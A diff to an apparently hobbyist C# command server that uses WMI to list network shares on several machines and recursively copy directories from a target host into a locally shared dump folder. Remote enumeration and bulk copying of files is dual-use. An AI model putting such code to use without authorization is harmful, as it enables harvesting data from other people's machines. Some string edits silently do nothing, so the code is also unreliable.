@@ -11,6 +11,7 @@ namespace server
 {
     class Server
     {
+        private static int count = 1;
         public static string CommandOutput(string command)
         {
             char[] seperator = { ' ' };
@@ -98,7 +99,7 @@ namespace server
                     break;
 
                 case "showfolder":
-                    output = ShowFolders(target);
+                    output = ShowFolders();
                     flag = true;
                     break;
 
@@ -108,7 +109,7 @@ namespace server
                     break;
 
                 case "copyfile":
-                    output = CopyDir(target, param[2], param[3]);
+                    output = CopyDir(target, param[2]);
                     flag = true;
                     break;
             }
@@ -189,11 +190,12 @@ namespace server
             }
             try
             {
+                Random rnd = new Random();
                 ManagementClass managementClass = new ManagementClass("Win32_Share");
                 ManagementBaseObject inParams = managementClass.GetMethodParameters("Create");
                 ManagementBaseObject outParams;
                 inParams["Description"] = "SharedTestApplication";
-                inParams["Name"] = "sharedfolder";
+                inParams["Name"] = "sharefolder" + rnd.Next(10,99);
                 inParams["Path"] = sharefolder;
                 inParams["Type"] = 0x0;
                 outParams = managementClass.InvokeMethod("Create", inParams, null);
@@ -201,7 +203,7 @@ namespace server
                 if ((uint)outParams.Properties["ReturnValue"].Value != 0)
                     return "error no: " + (uint)outParams.Properties["ReturnValue"].Value;
                 else
-                    return "folder successfully set as shared";
+                    return "folder successfully set as shared with the net-name " + inParams["Name"];
             }
             catch (Exception ex)
             {
@@ -244,15 +246,22 @@ namespace server
                 return "bruh you failed";
         }
 
-        private static string ShowFolders(string target)
+        private static string ShowFolders()
         {
             string output = "";
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher("\\\\" + target + "\\root\\CIMV2", "SELECT * FROM Win32_Share");
+            Queue<string> q = Program.machname;
+            for (int i = 0; i < q.Count; i++)
+            {
+                string mach = q.Dequeue();
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("\\\\" + mach + "\\root\\CIMV2", "SELECT * FROM Win32_Share");
 
-            foreach (ManagementObject mo in searcher.Get())
-                if (!mo["Name"].ToString().Contains("$")) 
-                    output += mo["Path"] + "\n";
+                output += mach + "'s shared folders and drives: \n";
+                foreach (ManagementObject mo in searcher.Get())
+                    if (!mo["Name"].ToString().Contains("$"))
+                        output += mo["Path"] + "\n";
 
+                q.Enqueue(mach);
+            }
             return output;
         }
 
@@ -283,25 +292,42 @@ namespace server
                 return "";
             return ", did you mean " + sim + "?";
         }
-        public static string CopyDir(string target, string srcpath, string dstpath)
+        public static string CopyDir(string target, string srcpath, bool prob = true)
         {
-            ManagementScope scope = new ManagementScope("\\\\" + Environment.MachineName + "\\root\\CIMV2");    //target
-            ManagementPath managementPath = new ManagementPath("Win32_Directory.Name=" + "\"" + srcpath.Replace("\\","\\\\") + "\"");
+            ManagementScope scope = new ManagementScope("\\\\" + target + "\\root\\CIMV2");         //target
+            ManagementPath managementPath;                                          
+            if (target == Environment.MachineName)
+                managementPath = new ManagementPath("Win32_Directory.Name=" + "\"" + srcpath.Replace("\\","\\\\") + "\"");
+            else
+            {
+                srcpath.Remove(0, 4);
+                srcpath.Insert(0, "\\" + target);
+                managementPath = new ManagementPath("Win32_Directory.Name=" + "\"" + srcpath.Replace("\\", "\\\\") + "\"");
+            }
             ManagementObject classInstance = new ManagementObject(scope, managementPath, null);
             ManagementBaseObject inParams = classInstance.GetMethodParameters("CopyEx");
-            inParams["FileName"] = dstpath;
+            ShareFolder(Environment.MachineName, "C:\\dump_folder");
+            if (!prob)
+            {
+                inParams["FileName"] = "C:\\dump_folder\\dump_no' " + count;
+                count++;
+            }
+            else
+                inParams["FileName"] = "C:\\dump_folder";
             inParams["Recursive"] = true;
             inParams["StartFileName"] = null;
 
             ManagementBaseObject outParams = classInstance.InvokeMethod("CopyEx", inParams, null);
 
-            if ((uint)outParams.Properties["ReturnValue"].Value == 0)
-                return "copied the file";
-            return "failure";
+            uint output = (uint)outParams.Properties["ReturnValue"].Value;
+            if (output == 0)
+                return "copied the files";
+
+            else if (output == 10)
+                return CopyDir(target, srcpath, false);
+
+            return "failure, errno: " + (uint)outParams.Properties["ReturnValue"].Value;
 
         }
     }
 }
-
-    
-
